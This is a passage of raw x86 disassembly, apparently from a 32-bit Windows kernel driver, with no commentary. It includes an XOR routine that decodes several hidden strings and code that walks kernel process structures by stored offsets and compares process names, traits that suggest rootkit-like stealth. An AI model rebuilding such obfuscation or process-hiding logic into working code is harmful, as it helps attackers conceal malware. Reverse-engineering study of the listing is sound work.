   13196:	lea    edx,[eax+0x2]
   13199:	mov    cx,WORD PTR [eax]
   1319c:	inc    eax
   1319d:	inc    eax
   1319e:	test   cx,cx
   131a1:	jne    0x13199
   131a3:	sub    eax,edx
   131a5:	sar    eax,1
   131a7:	jmp    0x131ab
   131a9:	mov    eax,ebx
   131ab:	push   eax
   131ac:	lea    eax,[ebp-0x61c]
   131b2:	push   esi
   131b3:	push   eax
   131b4:	call   DWORD PTR ds:0x1b194
   131ba:	mov    esi,DWORD PTR ds:0x1b1c8
   131c0:	lea    eax,[ebp-0x61c]
   131c6:	push   0x1a5f2
   131cb:	push   eax
   131cc:	call   esi
   131ce:	add    esp,0x14
   131d1:	test   eax,eax
   131d3:	mov    DWORD PTR [ebp-0x620],eax
   131d9:	je     0x13382
   131df:	lea    eax,[ebp-0x61c]
   131e5:	push   0x1a63e
   131ea:	push   eax
   131eb:	call   esi
   131ed:	test   eax,eax
   131ef:	pop    ecx
   131f0:	pop    ecx
   131f1:	je     0x13382
   131f7:	mov    ecx,DWORD PTR [ebp-0x620]
   131fd:	sub    ecx,eax
   131ff:	and    ecx,0xfffffffe
   13202:	cmp    ecx,0x22
   13205:	jne    0x13382
   1320b:	push   edi
   1320c:	lea    eax,[ebp-0x20c]
   13212:	push   0x0
   13214:	push   eax
   13215:	call   0x1a1b0
   1321a:	push   edi
   1321b:	lea    eax,[ebp-0x414]
   13221:	push   0x0
   13223:	push   eax
   13224:	call   0x1a1b0
   13229:	add    DWORD PTR [ebp-0x620],0x14
   13230:	mov    eax,DWORD PTR [ebp-0x620]
   13236:	movzx  eax,WORD PTR [eax]
   13239:	add    esp,0x18
   1323c:	test   ax,ax
   1323f:	je     0x13261
   13241:	lea    ecx,[ebp-0x414]
   13247:	add    DWORD PTR [ebp-0x620],0x2
   1324e:	mov    WORD PTR [ecx],ax
   13251:	mov    eax,DWORD PTR [ebp-0x620]
   13257:	movzx  eax,WORD PTR [eax]
   1325a:	inc    ecx
   1325b:	inc    ecx
   1325c:	test   ax,ax
   1325f:	jne    0x13247
   13261:	xor    eax,eax
   13263:	movzx  ecx,WORD PTR [eax+0x1a66e]
   1326a:	mov    WORD PTR [ebp+eax*1-0x20c],cx
   13272:	inc    eax
   13273:	inc    eax
   13274:	test   cx,cx
   13277:	jne    0x13263
   13279:	lea    eax,[ebp-0x414]
   1327f:	lea    edx,[eax+0x2]
   13282:	mov    cx,WORD PTR [eax]
   13285:	inc    eax
   13286:	inc    eax
   13287:	test   cx,cx
   1328a:	jne    0x13282
   1328c:	sub    eax,edx
   1328e:	sar    eax,1
   13290:	mov    esi,eax
   13292:	lea    eax,[ebp-0x20c]
   13298:	lea    edx,[eax+0x2]
   1329b:	mov    cx,WORD PTR [eax]
   1329e:	inc    eax
   1329f:	inc    eax
   132a0:	test   cx,cx
   132a3:	jne    0x1329b
   132a5:	sub    eax,edx
   132a7:	sar    eax,1
   132a9:	mov    ecx,ebx
   132ab:	sub    ecx,eax
   132ad:	cmp    esi,ecx
   132af:	jae    0x132ca
   132b1:	lea    eax,[ebp-0x414]
   132b7:	lea    edx,[eax+0x2]
   132ba:	mov    cx,WORD PTR [eax]
   132bd:	inc    eax
   132be:	inc    eax
   132bf:	test   cx,cx
   132c2:	jne    0x132ba
   132c4:	sub    eax,edx
   132c6:	sar    eax,1
   132c8:	jmp    0x132e7
   132ca:	lea    eax,[ebp-0x20c]
   132d0:	lea    edx,[eax+0x2]
   132d3:	mov    cx,WORD PTR [eax]
   132d6:	inc    eax
   132d7:	inc    eax
   132d8:	test   cx,cx
   132db:	jne    0x132d3
   132dd:	sub    eax,edx
   132df:	sar    eax,1
   132e1:	mov    ecx,eax
   132e3:	mov    eax,ebx
   132e5:	sub    eax,ecx
   132e7:	mov    edi,DWORD PTR ds:0x1b190
   132ed:	push   eax
   132ee:	lea    eax,[ebp-0x414]
   132f4:	push   eax
   132f5:	lea    eax,[ebp-0x20c]
   132fb:	push   eax
   132fc:	call   edi
   132fe:	mov    eax,DWORD PTR [ebp-0x620]
   13304:	add    esp,0xc
   13307:	lea    edx,[eax+0x2]
   1330a:	mov    cx,WORD PTR [eax]
   1330d:	inc    eax
   1330e:	inc    eax
   1330f:	test   cx,cx
   13312:	jne    0x1330a
   13314:	sub    eax,edx
   13316:	sar    eax,1
   13318:	mov    esi,eax
   1331a:	lea    eax,[ebp-0x20c]
   13320:	lea    edx,[eax+0x2]
   13323:	mov    cx,WORD PTR [eax]
   13326:	inc    eax
   13327:	inc    eax
   13328:	test   cx,cx
   1332b:	jne    0x13323
   1332d:	sub    eax,edx
   1332f:	sar    eax,1
   13331:	mov    ecx,ebx
   13333:	sub    ecx,eax
   13335:	cmp    esi,ecx
   13337:	jae    0x13352
   13339:	mov    eax,DWORD PTR [ebp-0x620]
   1333f:	lea    edx,[eax+0x2]
   13342:	mov    cx,WORD PTR [eax]
   13345:	inc    eax
   13346:	inc    eax
   13347:	test   cx,cx
   1334a:	jne    0x13342
   1334c:	sub    eax,edx
   1334e:	sar    eax,1
   13350:	jmp    0x1336f
   13352:	lea    eax,[ebp-0x20c]
   13358:	lea    edx,[eax+0x2]
   1335b:	mov    cx,WORD PTR [eax]
   1335e:	inc    eax
   1335f:	inc    eax
   13360:	test   cx,cx
   13363:	jne    0x1335b
   13365:	sub    eax,edx
   13367:	sar    eax,1
   13369:	mov    ecx,eax
   1336b:	mov    eax,ebx
   1336d:	sub    eax,ecx
   1336f:	push   eax
   13370:	push   DWORD PTR [ebp-0x620]
   13376:	lea    eax,[ebp-0x20c]
   1337c:	push   eax
   1337d:	call   edi
   1337f:	add    esp,0xc
   13382:	cmp    WORD PTR [ebp-0x20c],0x0
   1338a:	pop    ebx
   1338b:	je     0x133d3
   1338d:	lea    eax,[ebp-0x20c]
   13393:	xor    edi,edi
   13395:	lea    edx,[eax+0x2]
   13398:	mov    cx,WORD PTR [eax]
   1339b:	inc    eax
   1339c:	inc    eax
   1339d:	test   cx,cx
   133a0:	jne    0x13398
   133a2:	mov    ecx,DWORD PTR [ebp+0xc]
   133a5:	sub    eax,edx
   133a7:	sar    eax,1
   133a9:	dec    ecx
   133aa:	cmp    eax,ecx
   133ac:	jae    0x133c7
   133ae:	lea    eax,[ebp-0x20c]
   133b4:	lea    edx,[eax+0x2]
   133b7:	mov    cx,WORD PTR [eax]
   133ba:	inc    eax
   133bb:	inc    eax
   133bc:	test   cx,cx
   133bf:	jne    0x133b7
   133c1:	sub    eax,edx
   133c3:	sar    eax,1
   133c5:	jmp    0x133c9
   133c7:	mov    eax,ecx
   133c9:	push   eax
   133ca:	lea    eax,[ebp-0x20c]
   133d0:	push   eax
   133d1:	jmp    0x13430
   133d3:	mov    esi,DWORD PTR [ebp+0x14]
   133d6:	test   esi,esi
   133d8:	mov    edi,0xc0000001
   133dd:	je     0x133e5
   133df:	mov    eax,esi
   133e1:	shr    eax,1
   133e3:	jmp    0x133fc
   133e5:	mov    eax,DWORD PTR [ebp-0x624]
   133eb:	lea    edx,[eax+0x2]
   133ee:	mov    cx,WORD PTR [eax]
   133f1:	inc    eax
   133f2:	inc    eax
   133f3:	test   cx,cx
   133f6:	jne    0x133ee
   133f8:	sub    eax,edx
   133fa:	sar    eax,1
   133fc:	mov    ecx,DWORD PTR [ebp+0xc]
   133ff:	dec    ecx
   13400:	cmp    eax,ecx
   13402:	jae    0x13427
   13404:	test   esi,esi
   13406:	je     0x1340e
   13408:	shr    esi,1
   1340a:	mov    eax,esi
   1340c:	jmp    0x13429
   1340e:	mov    eax,DWORD PTR [ebp-0x624]
   13414:	lea    edx,[eax+0x2]
   13417:	mov    cx,WORD PTR [eax]
   1341a:	inc    eax
   1341b:	inc    eax
   1341c:	test   cx,cx
   1341f:	jne    0x13417
   13421:	sub    eax,edx
   13423:	sar    eax,1
   13425:	jmp    0x13429
   13427:	mov    eax,ecx
   13429:	push   eax
   1342a:	push   DWORD PTR [ebp-0x624]
   13430:	push   DWORD PTR [ebp-0x628]
   13436:	call   DWORD PTR ds:0x1b194
   1343c:	add    esp,0xc
   1343f:	mov    eax,edi
   13441:	pop    edi
   13442:	jmp    0x13449
   13444:	mov    eax,0xc0000001
   13449:	mov    ecx,DWORD PTR [ebp-0x4]
   1344c:	xor    ecx,ebp
   1344e:	pop    esi
   1344f:	call   0x1a164
   13454:	leave  
   13455:	ret    0x10
   13458:	int3   
   13459:	int3   
   1345a:	int3   
   1345b:	int3   
   1345c:	int3   
   1345d:	int3   
   1345e:	mov    edi,edi
   13460:	push   ebp
   13461:	mov    ebp,esp
   13463:	push   ebx
   13464:	mov    ebx,DWORD PTR [ebp+0xc]
   13467:	push   esi
   13468:	push   edi
   13469:	xor    edi,edi
   1346b:	xor    esi,esi
   1346d:	cmp    ebx,edi
   1346f:	je     0x1349e
   13471:	push   edi
   13472:	push   edi
   13473:	push   edi
   13474:	push   DWORD PTR [ebp+0x10]
   13477:	push   DWORD PTR [ebp+0x8]
   1347a:	call   DWORD PTR ds:0x1b1d4
   13480:	mov    esi,eax
   13482:	cmp    esi,edi
   13484:	je     0x1349e
   13486:	push   esi
   13487:	call   DWORD PTR ds:0x1b1d0
   1348d:	push   0x10
   1348f:	push   edi
   13490:	push   edi
   13491:	push   0x1
   13493:	push   0x1
   13495:	push   esi
   13496:	call   DWORD PTR ds:0x1b1cc
   1349c:	mov    edi,eax
   1349e:	mov    eax,edi
   134a0:	pop    edi
   134a1:	mov    DWORD PTR [ebx],esi
   134a3:	pop    esi
   134a4:	pop    ebx
   134a5:	pop    ebp
   134a6:	ret    0xc
   134a9:	int3   
   134aa:	int3   
   134ab:	int3   
   134ac:	int3   
   134ad:	int3   
   134ae:	mov    edi,edi
   134b0:	push   ebp
   134b1:	mov    ebp,esp
   134b3:	sub    esp,0x648
   134b9:	mov    eax,ds:0x1bb6c
   134be:	xor    eax,ebp
   134c0:	mov    DWORD PTR [ebp-0x4],eax
   134c3:	mov    eax,DWORD PTR [ebp+0x8]
   134c6:	push   ebx
   134c7:	mov    DWORD PTR [ebp-0x640],eax
   134cd:	mov    eax,DWORD PTR [ebp+0xc]
   134d0:	push   esi
   134d1:	push   edi
   134d2:	mov    DWORD PTR [ebp-0x63c],eax
   134d8:	xor    ebx,ebx
   134da:	xor    eax,eax
   134dc:	mov    WORD PTR [ebp-0x14],bx
   134e0:	lea    edi,[ebp-0x12]
   134e3:	stos   DWORD PTR es:[edi],eax
   134e4:	stos   DWORD PTR es:[edi],eax
   134e5:	stos   DWORD PTR es:[edi],eax
   134e6:	mov    esi,0x204
   134eb:	push   esi
   134ec:	stos   WORD PTR es:[edi],ax
   134ee:	lea    eax,[ebp-0x628]
   134f4:	push   ebx
   134f5:	push   eax
   134f6:	mov    BYTE PTR [ebp-0x62d],bl
   134fc:	mov    DWORD PTR [ebp-0x62c],ebx
   13502:	call   0x1a1b0
   13507:	push   esi
   13508:	lea    eax,[ebp-0x420]
   1350e:	push   ebx
   1350f:	push   eax
   13510:	mov    DWORD PTR [ebp-0x424],ebx
   13516:	call   0x1a1b0
   1351b:	push   esi
   1351c:	lea    eax,[ebp-0x218]
   13522:	push   ebx
   13523:	push   eax
   13524:	mov    DWORD PTR [ebp-0x21c],ebx
   1352a:	call   0x1a1b0
   1352f:	add    esp,0x24
   13532:	cmp    DWORD PTR [ebp-0x640],ebx
   13538:	mov    DWORD PTR [ebp-0x644],ebx
   1353e:	je     0x13819
   13544:	cmp    DWORD PTR [ebp-0x63c],ebx
   1354a:	je     0x13819
   13550:	cmp    DWORD PTR ds:0x1bfa8,ebx
   13556:	je     0x13819
   1355c:	cmp    DWORD PTR ds:0x1bfac,ebx
   13562:	je     0x13819
   13568:	cmp    DWORD PTR ds:0x1bfb0,ebx
   1356e:	je     0x13819
   13574:	call   DWORD PTR ds:0x1b1a8
   1357a:	cmp    BYTE PTR ds:0x1bf91,bl
   13580:	mov    esi,eax
   13582:	mov    eax,ds:0x1bfa8
   13587:	mov    eax,DWORD PTR [eax+esi*1]
   1358a:	mov    DWORD PTR [ebp-0x648],eax
   13590:	mov    DWORD PTR [ebp-0x638],eax
   13596:	je     0x13694
   1359c:	xor    eax,eax
   1359e:	movzx  ecx,WORD PTR [eax+0x1a61a]
   135a5:	mov    WORD PTR [ebp+eax*1-0x424],cx
   135ad:	inc    eax
   135ae:	inc    eax
   135af:	cmp    cx,bx
   135b2:	jne    0x1359e
   135b4:	mov    edi,0x1a6aa
   135b9:	mov    eax,edi
   135bb:	lea    edx,[eax+0x2]
   135be:	mov    cx,WORD PTR [eax]
   135c1:	inc    eax
   135c2:	inc    eax
   135c3:	cmp    cx,bx
   135c6:	jne    0x135be
   135c8:	sub    eax,edx
   135ca:	sar    eax,1
   135cc:	mov    DWORD PTR [ebp-0x634],eax
   135d2:	lea    eax,[ebp-0x424]
   135d8:	lea    edx,[eax+0x2]
   135db:	mov    cx,WORD PTR [eax]
   135de:	inc    eax
   135df:	inc    eax
   135e0:	cmp    cx,bx
   135e3:	jne    0x135db
   135e5:	sub    eax,edx
   135e7:	mov    ecx,0x103
   135ec:	sar    eax,1
   135ee:	mov    edx,ecx
   135f0:	sub    edx,eax
   135f2:	cmp    DWORD PTR [ebp-0x634],edx
   135f8:	jae    0x13611
   135fa:	mov    eax,edi
   135fc:	lea    edx,[eax+0x2]
   135ff:	mov    cx,WORD PTR [eax]
   13602:	inc    eax
   13603:	inc    eax
   13604:	cmp    cx,bx
   13607:	jne    0x135ff
   13609:	sub    eax,edx
   1360b:	sar    eax,1
   1360d:	mov    ecx,eax
   1360f:	jmp    0x13634
   13611:	lea    eax,[ebp-0x424]
   13617:	lea    edx,[eax+0x2]
   1361a:	mov    DWORD PTR [ebp-0x634],edx
   13620:	mov    dx,WORD PTR [eax]
   13623:	inc    eax
   13624:	inc    eax
   13625:	cmp    dx,bx
   13628:	jne    0x13620
   1362a:	sub    eax,DWORD PTR [ebp-0x634]
   13630:	sar    eax,1
   13632:	sub    ecx,eax
   13634:	push   ecx
   13635:	lea    eax,[ebp-0x424]
   1363b:	push   edi
   1363c:	push   eax
   1363d:	call   DWORD PTR ds:0x1b190
   13643:	push   0x208
   13648:	lea    eax,[ebp-0x21c]
   1364e:	push   ebx
   1364f:	push   eax
   13650:	call   0x1a1b0
   13655:	add    esp,0x18
   13658:	push   ebx
   13659:	push   ebx
   1365a:	lea    eax,[ebp-0x424]
   13660:	push   eax
   13661:	push   0x104
   13666:	lea    eax,[ebp-0x21c]
   1366c:	push   eax
   1366d:	call   0x12610
   13672:	cmp    WORD PTR [ebp-0x21c],bx
   13679:	je     0x13694
   1367b:	xor    eax,eax
   1367d:	movzx  ecx,WORD PTR [ebp+eax*1-0x21c]
   13685:	mov    WORD PTR [ebp+eax*1-0x424],cx
   1368d:	inc    eax
   1368e:	inc    eax
   1368f:	cmp    cx,bx
   13692:	jne    0x1367d
   13694:	cmp    DWORD PTR [ebp-0x644],0x1
   1369b:	jl     0x136af
   1369d:	mov    eax,DWORD PTR [ebp-0x638]
   136a3:	cmp    DWORD PTR [ebp-0x648],eax
   136a9:	je     0x13811
   136af:	mov    eax,ds:0x1bfac
   136b4:	mov    esi,DWORD PTR [eax+esi*1]
   136b7:	sub    esi,eax
   136b9:	mov    eax,ds:0x1bfa8
   136be:	mov    eax,DWORD PTR [eax+esi*1]
   136c1:	mov    DWORD PTR [ebp-0x638],eax
   136c7:	xor    eax,eax
   136c9:	lea    edi,[ebp-0x14]
   136cc:	stos   DWORD PTR es:[edi],eax
   136cd:	stos   DWORD PTR es:[edi],eax
   136ce:	stos   DWORD PTR es:[edi],eax
   136cf:	stos   DWORD PTR es:[edi],eax
   136d0:	mov    eax,ds:0x1bfb0
   136d5:	add    eax,esi
   136d7:	push   0xf
   136d9:	push   eax
   136da:	lea    eax,[ebp-0x14]
   136dd:	push   eax
   136de:	call   DWORD PTR ds:0x1b1a4
   136e4:	lea    eax,[ebp-0x14]
   136e7:	push   0x1a598
   136ec:	push   eax
   136ed:	call   DWORD PTR ds:0x1b140
   136f3:	add    esp,0x14
   136f6:	cmp    eax,ebx
   136f8:	je     0x136fd
   136fa:	mov    BYTE PTR [eax+0x4],bl
   136fd:	inc    DWORD PTR [ebp-0x644]
   13703:	cmp    BYTE PTR ds:0x1bf91,bl
   13709:	je     0x137db
   1370f:	lea    edi,[esi+0x1f4]
   13715:	push   edi
   13716:	call   DWORD PTR ds:0x1b130
   1371c:	test   al,al
   1371e:	je     0x13694
   13724:	mov    edi,DWORD PTR [edi]
   13726:	push   edi
   13727:	call   DWORD PTR ds:0x1b130
   1372d:	test   al,al
   1372f:	je     0x13694
   13735:	add    edi,0x4
   13738:	push   edi
   13739:	mov    DWORD PTR [ebp-0x634],edi
   1373f:	call   DWORD PTR ds:0x1b130
   13745:	test   al,al
   13747:	je     0x13694
   1374d:	mov    edi,0x208
   13752:	push   edi
   13753:	lea    eax,[ebp-0x62c]
   13759:	push   ebx
   1375a:	push   eax
   1375b:	call   0x1a1b0
   13760:	push   edi
   13761:	lea    eax,[ebp-0x21c]
   13767:	push   ebx
   13768:	push   eax
   13769:	call   0x1a1b0
   1376e:	push   0x103
   13773:	push   DWORD PTR [ebp-0x634]
   13779:	lea    eax,[ebp-0x62c]
   1377f:	push   eax
   13780:	call   DWORD PTR ds:0x1b194
   13786:	add    esp,0x24
   13789:	push   ebx
   1378a:	push   ebx
   1378b:	lea    eax,[ebp-0x62c]
   13791:	push   eax
   13792:	push   0x104
   13797:	lea    eax,[ebp-0x21c]
   1379d:	push   eax
   1379e:	call   0x12610
   137a3:	cmp    WORD PTR [ebp-0x21c],bx
   137aa:	je     0x137c5
   137ac:	xor    eax,eax
   137ae:	movzx  ecx,WORD PTR [ebp+eax*1-0x21c]
   137b6:	mov    WORD PTR [ebp+eax*1-0x62c],cx
   137be:	inc    eax
   137bf:	inc    eax
   137c0:	cmp    cx,bx
   137c3:	jne    0x137ae
   137c5:	lea    eax,[ebp-0x62c]
   137cb:	push   eax
   137cc:	lea    eax,[ebp-0x424]
   137d2:	push   eax
   137d3:	call   DWORD PTR ds:0x1b168
   137d9:	jmp    0x137ea
   137db:	lea    eax,[ebp-0x14]
   137de:	push   0x1a69c
   137e3:	push   eax
   137e4:	call   DWORD PTR ds:0x1b1d8
   137ea:	test   eax,eax
   137ec:	pop    ecx
   137ed:	pop    ecx
   137ee:	jne    0x13694
   137f4:	mov    eax,DWORD PTR [ebp-0x638]
   137fa:	mov    ecx,DWORD PTR [ebp-0x63c]
   13800:	mov    DWORD PTR [ecx],eax
   13802:	mov    eax,DWORD PTR [ebp-0x640]
   13808:	mov    BYTE PTR [ebp-0x62d],0x1
   1380f:	mov    DWORD PTR [eax],esi
   13811:	mov    al,BYTE PTR [ebp-0x62d]
   13817:	jmp    0x1381b
   13819:	xor    al,al
   1381b:	mov    ecx,DWORD PTR [ebp-0x4]
   1381e:	pop    edi
   1381f:	pop    esi
   13820:	xor    ecx,ebp
   13822:	pop    ebx
   13823:	call   0x1a164
   13828:	leave  
   13829:	ret    0x8
   1382c:	int3   
   1382d:	int3   
   1382e:	int3   
   1382f:	int3   
   13830:	int3   
   13831:	int3   
   13832:	mov    edi,edi
   13834:	push   ebp
   13835:	mov    ebp,esp
   13837:	xor    ecx,ecx
   13839:	cmp    DWORD PTR [ebp+0xc],ecx
   1383c:	jbe    0x13851
   1383e:	mov    eax,DWORD PTR [ebp+0x8]
   13841:	mov    dx,WORD PTR [ebp+0x10]
   13845:	lea    eax,[eax+ecx*2]
   13848:	xor    WORD PTR [eax],dx
   1384b:	inc    ecx
   1384c:	cmp    ecx,DWORD PTR [ebp+0xc]
   1384f:	jb     0x1383e
   13851:	pop    ebp
   13852:	ret    0xc
   13855:	int3   
   13856:	int3   
   13857:	int3   
   13858:	int3   
   13859:	int3   
   1385a:	mov    edi,edi
   1385c:	push   ebx
   1385d:	push   esi
   1385e:	push   edi
   1385f:	mov    ecx,0x1b740
   13864:	mov    eax,ecx
   13866:	push   0x2
   13868:	lea    esi,[eax+0x2]
   1386b:	pop    ebx
   1386c:	mov    dx,WORD PTR [eax]
   1386f:	add    eax,ebx
   13871:	test   dx,dx
   13874:	jne    0x1386c
   13876:	push   0x14
   13878:	sub    eax,esi
   1387a:	pop    esi
   1387b:	push   esi
   1387c:	sar    eax,1
   1387e:	push   eax
   1387f:	push   ecx
   13880:	call   0x13832
   13885:	mov    ecx,0x1b680
   1388a:	mov    eax,ecx
   1388c:	lea    edx,[eax+0x2]
   1388f:	mov    di,WORD PTR [eax]
   13892:	add    eax,ebx
   13894:	test   di,di
   13897:	jne    0x1388f
   13899:	sub    eax,edx
   1389b:	push   esi
   1389c:	sar    eax,1
   1389e:	push   eax
   1389f:	push   ecx
   138a0:	call   0x13832
   138a5:	mov    ecx,0x1b69c
   138aa:	mov    eax,ecx
   138ac:	lea    edx,[eax+0x2]
   138af:	mov    di,WORD PTR [eax]
   138b2:	add    eax,ebx
   138b4:	test   di,di
   138b7:	jne    0x138af
   138b9:	sub    eax,edx
   138bb:	push   esi
   138bc:	sar    eax,1
   138be:	push   eax
   138bf:	push   ecx
   138c0:	call   0x13832
   138c5:	mov    ecx,0x1b6bc
   138ca:	mov    eax,ecx
   138cc:	lea    edx,[eax+0x2]
   138cf:	mov    di,WORD PTR [eax]
   138d2:	add    eax,ebx
   138d4:	test   di,di
   138d7:	jne    0x138cf
   138d9:	sub    eax,edx
   138db:	push   esi
   138dc:	sar    eax,1
   138de:	push   eax
   138df:	push   ecx
   138e0:	call   0x13832
   138e5:	mov    ecx,0x1b6d4
   138ea:	mov    eax,ecx
   138ec:	lea    edx,[eax+0x2]
   138ef:	mov    di,WORD PTR [eax]
   138f2:	add    eax,ebx
   138f4:	test   di,di
   138f7:	jne    0x138ef
   138f9:	sub    eax,edx
   138fb:	push   esi
   138fc:	sar    eax,1
   138fe:	push   eax
   138ff:	push   ecx
   13900:	call   0x13832
   13905:	mov    ecx,0x1b6ec
   1390a:	mov    eax,ecx
   1390c:	lea    edx,[eax+0x2]
   1390f:	mov    di,WORD PTR [eax]
   13912:	add    eax,ebx
   13914:	test   di,di
   13917:	jne    0x1390f
   13919:	sub    eax,edx
   1391b:	push   esi
   1391c:	sar    eax,1
   1391e:	push   eax
   1391f:	push   ecx
   13920:	call   0x13832
   13925:	mov    ecx,0x1b704
   1392a:	mov    eax,ecx
   1392c:	lea    edx,[eax+0x2]
   1392f:	mov    di,WORD PTR [eax]
   13932:	add    eax,ebx
   13934:	test   di,di
   13937:	jne    0x1392f
   13939:	sub    eax,edx
   1393b:	push   esi
   1393c:	sar    eax,1
   1393e:	push   eax
   1393f:	push   ecx
   13940:	call   0x13832
   13945:	mov    ecx,0x1b724
   1394a:	mov    eax,ecx
   1394c:	lea    edx,[eax+0x2]
   1394f:	mov    di,WORD PTR [eax]
   13952:	add    eax,ebx
   13954:	test   di,di
   13957:	jne    0x1394f
   13959:	sub    eax,edx
   1395b:	push   esi
   1395c:	sar    eax,1
   1395e:	push   eax
   1395f:	push   ecx
   13960:	call   0x13832
   13965:	pop    edi
   13966:	pop    esi
   13967:	pop    ebx
   13968:	ret    
   13969:	int3   
   1396a:	int3   
   1396b:	int3   
   1396c:	int3   
   1396d:	int3   
   1396e:	mov    edi,edi
   13970:	push   ebx
   13971:	push   esi
   13972:	push   edi
   13973:	mov    edi,DWORD PTR ds:0x1b124
   13979:	mov    esi,0x208
   1397e:	push   esi
   1397f:	xor    ebx,ebx
   13981:	push   0x1
   13983:	mov    WORD PTR ds:0x1c78a,si
   1398a:	mov    WORD PTR ds:0x1c788,bx
   13991:	call   edi
   13993:	cmp    eax,ebx
   13995:	mov    ds:0x1c78c,eax
   1399a:	jne    0x139a6
   1399c:	mov    eax,0xc000009a
   139a1:	jmp    0x13b10
   139a6:	movzx  ecx,WORD PTR ds:0x1c78a
   139ad:	push   ecx
   139ae:	push   ebx
   139af:	push   eax
   139b0:	call   0x1a1b0
   139b5:	add    esp,0xc
   139b8:	push   esi
   139b9:	push   0x1
   139bb:	mov    WORD PTR ds:0x1d2ea,si
   139c2:	mov    WORD PTR ds:0x1d2e8,bx
   139c9:	call   edi
   139cb:	cmp    eax,ebx
   139cd:	mov    ds:0x1d2ec,eax
   139d2:	je     0x1399c
   139d4:	movzx  ecx,WORD PTR ds:0x1d2ea
   139db:	push   ecx
   139dc:	push   ebx
   139dd:	push   eax
   139de:	call   0x1a1b0
   139e3:	add    esp,0xc
   139e6:	push   esi
   139e7:	push   0x1
   139e9:	mov    WORD PTR ds:0x1cc2a,si
   139f0:	mov    WORD PTR ds:0x1cc28,bx
   139f7:	call   edi
   139f9:	cmp    eax,ebx
   139fb:	mov    ds:0x1cc2c,eax
   13a00:	je     0x1399c
   13a02:	movzx  ecx,WORD PTR ds:0x1cc2a
   13a09:	push   ecx
   13a0a:	push   ebx
   13a0b:	push   eax
   13a0c:	call   0x1a1b0
   13a11:	add    esp,0xc
   13a14:	push   esi
   13a15:	push   0x1
   13a17:	mov    WORD PTR ds:0x1c792,si
   13a1e:	mov    WORD PTR ds:0x1c790,bx
   13a25:	call   edi
   13a27:	cmp    eax,ebx
   13a29:	mov    ds:0x1c794,eax
   13a2e:	je     0x1399c
   13a34:	movzx  ecx,WORD PTR ds:0x1c792
   13a3b:	push   ecx
   13a3c:	push   ebx
   13a3d:	push   eax
   13a3e:	call   0x1a1b0
   13a43:	add    esp,0xc
   13a46:	push   esi
   13a47:	push   0x1
   13a49:	mov    WORD PTR ds:0x1d72a,si
   13a50:	mov    WORD PTR ds:0x1d728,bx
   13a57:	call   edi
   13a59:	cmp    eax,ebx
   13a5b:	mov    ds:0x1d72c,eax
   13a60:	je     0x1399c
   13a66:	movzx  ecx,WORD PTR ds:0x1d72a
   13a6d:	push   ecx
   13a6e:	push   ebx
   13a6f:	push   eax
   13a70:	call   0x1a1b0
   13a75:	add    esp,0xc
   13a78:	push   esi
   13a79:	push   0x1
   13a7b:	mov    WORD PTR ds:0x1ca02,si
   13a82:	mov    WORD PTR ds:0x1ca00,bx
   13a89:	call   edi
   13a8b:	cmp    eax,ebx
   13a8d:	mov    ds:0x1ca04,eax
   13a92:	je     0x1399c
   13a98:	movzx  ecx,WORD PTR ds:0x1ca02
   13a9f:	push   ecx
   13aa0:	push   ebx
   13aa1:	push   eax
   13aa2:	call   0x1a1b0
   13aa7:	add    esp,0xc
   13aaa:	push   esi
   13aab:	push   0x1
   13aad:	mov    WORD PTR ds:0x1c0b2,si
   13ab4:	mov    WORD PTR ds:0x1c0b0,bx
   13abb:	call   edi
   13abd:	cmp    eax,ebx
   13abf:	mov    ds:0x1c0b4,eax
   13ac4:	je     0x1399c
   13aca:	movzx  ecx,WORD PTR ds:0x1c0b2
   13ad1:	push   ecx
   13ad2:	push   ebx
   13ad3:	push   eax
   13ad4:	call   0x1a1b0
   13ad9:	add    esp,0xc
   13adc:	push   esi
   13add:	push   0x1
   13adf:	mov    WORD PTR ds:0x1c09a,si
   13ae6:	mov    WORD PTR ds:0x1c098,bx
   13aed:	call   edi
   13aef:	cmp    eax,ebx
   13af1:	mov    ds:0x1c09c,eax
   13af6:	je     0x1399c
   13afc:	movzx  ecx,WORD PTR ds:0x1c09a
   13b03:	push   ecx
   13b04:	push   ebx
   13b05:	push   eax
   13b06:	call   0x1a1b0
   13b0b:	add    esp,0xc
   13b0e:	xor    eax,eax
   13b10:	pop    edi
   13b11:	pop    esi
   13b12:	pop    ebx
   13b13:	ret    
   13b14:	int3   
   13b15:	int3   
   13b16:	int3   
   13b17:	int3   
   13b18:	int3   
   13b19:	int3   
   13b1a:	mov    edi,edi
   13b1c:	push   ebp
   13b1d:	mov    ebp,esp
   13b1f:	sub    esp,0x58
   13b22:	push   esi
   13b23:	xor    esi,esi
   13b25:	cmp    DWORD PTR [ebp+0x8],esi
   13b28:	mov    DWORD PTR [ebp-0x10],0xc000000d
   13b2f:	mov    DWORD PTR [ebp-0x8],esi
   13b32:	mov    DWORD PTR [ebp-0xc],esi
   13b35:	je     0x13c8c
   13b3b:	push   ebx
   13b3c:	push   edi
   13b3d:	push   DWORD PTR [ebp+0x8]
   13b40:	mov    edi,DWORD PTR ds:0x1b164
   13b46:	lea    eax,[ebp-0x20]
   13b49:	push   eax
   13b4a:	call   edi
   13b4c:	push   0x18
   13b4e:	pop    ebx
   13b4f:	push   0x20
   13b51:	lea    eax,[ebp-0x20]
   13b54:	mov    DWORD PTR [ebp-0x38],eax
   13b57:	push   0x7
   13b59:	lea    eax,[ebp-0x18]
   13b5c:	push   eax
   13b5d:	lea    eax,[ebp-0x40]
   13b60:	push   eax
   13b61:	push   0x100001
   13b66:	lea    eax,[ebp-0x8]
   13b69:	push   eax
   13b6a:	mov    DWORD PTR [ebp-0x40],ebx
   13b6d:	mov    DWORD PTR [ebp-0x3c],esi
   13b70:	mov    DWORD PTR [ebp-0x34],0x240
   13b77:	mov    DWORD PTR [ebp-0x30],esi
   13b7a:	mov    DWORD PTR [ebp-0x2c],esi
   13b7d:	call   DWORD PTR ds:0x1b18c
   13b83:	test   eax,eax
   13b85:	jne    0x13c8a
   13b8b:	push   0x5
   13b8d:	push   ebx
   13b8e:	lea    eax,[ebp-0x58]
   13b91:	push   eax
   13b92:	lea    eax,[ebp-0x18]
   13b95:	push   eax
   13b96:	push   DWORD PTR [ebp-0x8]
   13b99:	call   DWORD PTR ds:0x1b188
   13b9f:	test   eax,eax
   13ba1:	jne    0x13c81
   13ba7:	mov    eax,DWORD PTR [ebp-0x50]
   13baa:	push   eax
   13bab:	push   0x1
   13bad:	mov    DWORD PTR [ebp+0x8],eax
   13bb0:	call   DWORD PTR ds:0x1b124
   13bb6:	cmp    eax,esi
   13bb8:	mov    DWORD PTR [ebp-0x4],eax
